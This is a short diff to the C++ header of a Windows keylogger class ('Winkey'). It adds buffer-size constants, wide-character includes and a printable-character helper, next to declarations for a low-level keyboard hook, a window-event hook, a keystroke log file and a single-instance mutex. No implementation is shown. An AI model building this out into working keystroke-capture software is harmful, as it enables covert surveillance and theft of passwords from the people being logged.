@@ -8,9 +8,14 @@
 # include <iomanip>			// For std::setw and std::setfill
 # include <thread>			// For sleep_for
 
+#include <locale>// For wide characters
+#include <codecvt>
+
 # define TW_MUTEX_NAME		"TYYghhTYU5678FuGHFGFHYFUIY67"
 # define TW_LOGFILE			"winkey.log"
 # define TW_MAX_SAME_VK		10	// Max amount of repetitive vkCode
+# define TW_WINTITLE_MAX	256
+# define TW_KEYSTROKE_MAX	64
 
 class	Winkey
 {
@@ -25,6 +30,7 @@ class	Winkey
 
 		void					setHooks();
 		static void				logToFile();
+		static bool				isPrintable(wchar_t c);
 
 		static LRESULT CALLBACK	lowLevelKeyboardProc(
 			const int nCode, const WPARAM wParam, const LPARAM lParam
@@ -36,9 +42,9 @@ class	Winkey
 
 		const char				*_logFileName;
 		static std::wofstream	_logFile;
-		static wchar_t			_windowTitle[256];
+		static wchar_t			_windowTitle[TW_WINTITLE_MAX];
 		static HWND				_currentWindow;
-		static std::wstring		_keyStroke;
+		static wchar_t			_keyStroke[TW_KEYSTROKE_MAX];
 		HANDLE					_singleInstanceMutex;
 		HWINEVENTHOOK			_winEventHook;
 		HHOOK   				_keyboardHook;
